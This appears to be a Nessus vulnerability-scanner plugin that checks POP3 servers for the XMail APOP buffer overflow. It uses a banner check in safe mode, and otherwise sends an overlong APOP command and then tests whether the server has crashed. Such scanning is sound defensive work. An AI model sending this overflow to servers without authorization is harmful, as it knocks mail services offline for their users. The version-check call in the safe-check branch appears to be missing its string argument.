#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(10559);
  script_version("$Revision: 1.30 $");

  script_cve_id("CVE-2000-0840", "CVE-2000-0841");
  script_bugtraq_id(1652);
  script_osvdb_id(458, 13179);

  script_name(english:"XMail APOP / USER Command Remote Overflow");
  script_summary(english:"Attempts to overflow the APOP command");

  script_set_attribute(  attribute:"synopsis",  value:
"The remote host is running a POP server with a remote root
vulnerability."  );
  script_set_attribute(  attribute:"description",  value:
"The remote host is running XMail, a POP3 server.  The installed version
is subject to a buffer overflow when it receives two arguments that are
too long for the APOP command.

An attacker could exploit this issue to disable the POP server or to
execute arbitrary code as root on the remote host."  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://seclists.org/bugtraq/2000/Sep/138"
  );
  script_set_attribute(
    attribute:"solution",
    value:"Contact the vendor for a patch."
  );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"plugin_publication_date", value: "2000/11/28");
 script_set_attribute(attribute:"vuln_publication_date", value: "2000/09/06");
 script_cvs_date("$Date: 2016/11/15 19:41:09 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Gain a shell remotely");
  script_copyright(english:"This script is Copyright (C) 2000-2016 Tenable Network Security, Inc.");
  script_dependencie("popserver_detect.nasl", "qpopper.nasl");
  script_require_ports("Services/pop3", 110);

  exit(0);
}

#
# The script code starts here
#

include('global_settings.inc');
include('misc_func.inc');

port = get_service(svc: "pop3", default: 110, exit_on_fail: 1);

if (report_paranoia < 1)
{
 fake = get_kb_item("pop3/"+port+"/false_pop3");
 if (fake) exit(0);
}

if(safe_checks())
{
 banner = get_kb_item(string("pop3/banner/", port));
 if(!banner)
 {
  soc = open_sock_tcp(port);
  if(!soc)exit(0); 
  banner = recv_line(socket:soc, length:4096);
 }
 
 if(!banner)exit(0);
 
 if(ereg(pattern:".*[xX]mail.*", string:banner))
 {
  if(ereg(pattern:"[^0-9]*0\.(([0-4][0-9])|(5[0-8]))[^0-9]*.*"))
  {
    notice = string(
      "*** Nessus reports this vulnerability using only\n",
      "*** information that was gathered. Use caution\n",
      "*** when testing without safe checks enabled."
    );
    security_hole(port:port, extra:notice);
  }
 }
 exit(0);
}

 soc = open_sock_tcp(port);
 if(! soc) exit(0);

  d = recv_line(socket:soc, length:1024);
  if(!d || !ereg(pattern:".*[xX]mail.*", string:d))
  {
   close(soc);
   exit(0);
  }
  c = string("APOP ", crap(2048), " ", crap(2048), "\r\n");
  send(socket:soc, data:c);
  r = recv_line(socket:soc, length:1024);

  close(soc);

for (i = 1; i <= 3; i ++)
{
  soc = open_sock_tcp(port);
  if (soc) break;
  sleep(i);
}
  if(!soc)security_hole(port);
  else {
   	r = recv_line(socket:soc, length:1024);
	if(!r)security_hole(port);
	close(soc);
	}
